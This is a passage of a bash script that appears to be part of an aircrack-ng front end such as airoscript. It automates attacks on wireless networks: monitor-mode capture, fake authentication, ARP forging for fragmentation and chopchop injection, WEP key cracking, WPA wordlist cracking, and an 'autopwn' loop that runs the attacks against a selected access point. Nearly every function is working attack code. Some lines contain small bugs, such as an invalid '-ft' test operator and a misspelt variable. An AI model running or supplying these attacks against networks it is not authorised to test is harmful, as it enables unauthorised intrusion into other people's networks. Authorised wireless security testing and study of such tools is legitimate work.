		if [ "$Host_MAC" = "" ]; then
			$clear && echo `gettext 'ERROR: You must select a target first' `
		else
		$ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
		rm -rf $DUMP_PATH/chopchop_$Host_MAC*
		$ARPFORGE -0 -a $Host_MAC -h $1 -k $Client_IP -l $Host_IP -w $DUMP_PATH/chopchop_$Host_MAC.cap -y *.xor	
		execute "ChopChop End" $AIREPLAY --interactive -r $DUMP_PATH/chopchop_$Host_MAC.cap -h $1 -x $INJECTRATE $IWIFI & menufonction
		fi
	}

	function capture {
		hardclean 
		execute "Capturing" $AIRODUMP --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $WIFI
	}

	function fakeauth {
	    execute "Fake auth on $Host_SSID" $AIREPLAY --fakeauth $AUTHDELAY -q $KEEPALIVE -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $IWIFI
	}

	function menufonction {
		execute "Fake function to jump to menu" echo "Aircrack-ng is a great tool, Mister_X ASPj & HIRTE are GODS"
	}

	function Host_ssidinput {
		echo "---------------------------------------"
		echo -e "`gettext \"###       Please enter SSID         ###\"`"
		read Host_SSID
		$clear
	}

function witchconfigure { if [ $Host_ENC = "WEP" ]; then configure; else wpaconfigure; fi; }

function configure {
		$AIRCRACK -a 1 -b $Host_MAC -s -0 -z $DUMP_PATH/$Host_MAC-01.cap &> $DUMP_PATH/$Host_MAC.key
		KEY=`cat $DUMP_PATH/$Host_MAC.key | grep -a KEY | awk '{ print $4 }'`
}

function wpaconfigure {
		$AIRCRACK $FORCEWPAKOREK -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $WORDLIST &> $DUMP_PATH/$Host_MAC.key
		KEY=`cat $DUMP_PATH/$Host_MAC.key | grep -a KEY | awk '{ print $4 }'`
}

function doauto {
    F=0; export AUTO=1; export QUIET=1; export INTERACTIVE=0
        # Select target:
        choosescan
        choosetype
		if [ -e $DUMP_PATH/dump-01.csv ]; then
			Parseforap && $clear
			if [ "$Host_SSID" = $'\r' ] || [ "$Host_SSID" = "No SSID has been detected" ]; then blankssid; fi
			target && choosetarget && $clear
		else
			$clear; echo "ERROR: You have to scan for targets first"
		fi
		autopwn
}

function autopwn(){ 
    F=0; export AUTO=1; export QUIET=1; export INTERACTIVE=0

    for i in $attack_functions; do
        $i & cleanp &
        while [ "1" ]; do 
            if [ "$F" == "1" ]; then break; fi
            sleep $autopwn_min_sleep; 
            if [ "`check_if_worked`" == 1 ]; then auto; F=1; fi
            return
        done
        [[ `check_if_worked` == 1 ]] && auto
        return
    done

    export AUTO=0; export QUIET=0; export INTERACTIVE=1 

}

function cleanp(){ F=1; sleep $autopwn_sleep && clean_processes; }

function check_all_ivs(){
    for i in $DUMP_PATH/$Host_MAC*.cap; do
       maxn=$(( $maxn + `ivstools --convert $i|awk '/IVs/ {print $2}'` )); 
    done
    return $maxn
}

function check_if_worked(){
    min_ivs=`$AIROSCWORDLIST -m $Host_MAC $Host_SSID`
    if [ `check_all_ivs` -ft "$min_ivs" ]; then return 1; fi
    return 0
}

function checkforcemac() {
    if [ $FORCE_MAC_ADDRESS -eq 1 ]; then $clear && echo "Warn: Not checking mac" && menu
    else
    	mac=`$MACCHANGER -s wlan0|awk {'print $3'}`
	    if [ "$FAKE_MAC" != "$mac" ]; then wichchangemac;$clear;menu; fi
    fi
}

function guess_idata(){
	AIROUTPUT=$($AIRMON $1 $WIFICARD|grep -v "running"|grep -A 1 $WIFICARD);
	export TYPE=`echo \"$AIROUTPUT\" | grep monitor      | awk '{print $2 $3}'`
	export DRIVER=`echo \"$AIROUTPUT\" | grep monitor      | awk '{print $4}'`
	export tmpwifi=`echo \"$AIROUTPUT\" | awk {'print $NF'} | cut -d ")" -f1`
    if [[ "$tmpwifi" =~ (.*)[0-9] ]];  then WIFI=$tmpwifi; fi
}

function setinterface {
	INTERFACES=`ip link|egrep "^[0-9]+"|cut -d ':' -f 2 |awk {'print $1'} |grep -v lo`
    if [ "$WIFI" = "" ]; then

        # Select interface
		echo -e "\n_____"`gettext 'Interface selection'`"_____"
		PS3="`gettext 'Select your interface: '`"
		select WIFI in $INTERFACES; do break; done
		export WIFICARD=$WIFI

        #Put interface in monmode
		echo -e "\t__________________________________\n"
		echo -ne `gettext '\t Should I put it in monitor mode?'` " (Y/n) "
        ac="stop"; read answer; [[ "$anwser" != n ]] && ac="start"
        guess_idata $ac && $clear
		echo  `gettext 'Interface used is :'` $WIFI\
		`gettext 'Interface type is :'` "$TYPE ($DRIVER)"

        # Check mac
		testmac

        # Ask for airserv-ng
		read -p "Do you want to use airserv-ng? [y/N] " var
		if [ "$var" == "y" ]; then
			export WIFICARD=$WIFI && read -p "Start a local server? [y/N] " var
			if [ "$var" == "y" ]; then export WIFI="127.0.0.1:666" && $AIRSERV -d  $WIFICARD >/dev/null 2>1 &
			else read -p "Enter airserv-ng address [127.0.0.1:666]" WIFI
				if [ "$WIFI" == "" ]; then export WIFI="127.0.0.1:666";fi
			fi
		fi

		export IWIFI=$WIFI
	else
		echo -n `gettext 'Shall I put in monitor mode'` $WIFI "? (Y/n) "
		read answer
			if [ "$answer" != "n" ]; then
				TYPE=`$AIRMON start $WIFICARD | grep monitor | awk '{print $2 $3}'`
                DRIVER="$TYPE"
			else
				TYPE=`$AIRMON stop $WIFICARD | grep monitor | awk '{print $2 $3}'`
                DRIVER="$TYPE"
			fi

		$clear
		echo  `gettext 'Interface used is :'` $WIFI $IWIFI
		echo  `gettext 'Interface type is :'` "$TYPE ($DRIVER)"
		testmac
	fi
}


testmac(){
	if [ "$TYPE" = "Atherosmadwifi-ng" ]; then
		FAKE_MAC=`ifconfig $WIFICARD | grep $WIFI | awk '{print $5}' | cut -c -17  | sed -e "s/-/:/" | sed -e "s/\-/:/"  | sed -e "s/\-/:/" | sed -e "s/\-/:/" | sed -e "s/\-/:/"`
		echo -e "`gettext \"Changed fake_mac : $FAKE_MAC\"`"
	fi
}

blankssid(){
	while true; do
		$clear
        mkmenu "Blank SSID, enter manually?" "Yes" "No" 
		read yn; case $yn in
			1 ) Host_ssidinput ; break ;;
			2 ) Host_SSID="" ; break ;;
			* ) echo "unknown response. Try again" ;;
		esac
	done
}

function target {
	echo -e "`gettext \"
_______Target information______

   AP SSID       = $Host_SSID
   AP MAC        = $Host_MAC
   AP Channel    =$Host_CHAN
   Client MAC    = $Client_MAC
   Fake MAC      = $FAKE_MAC
   AP Encryption =$Host_ENC
   AP Speed      =$Host_SPEED
________________________________\"`"
}

function checkdir {
    if [ -d $DUMP_PATH ]; then
        if [ "$DEBUG" == 1 ]; then
            echo -e "`gettext \"[INFO] Output folder is $DUMP_PATH\"`";
        fi
    fi
}
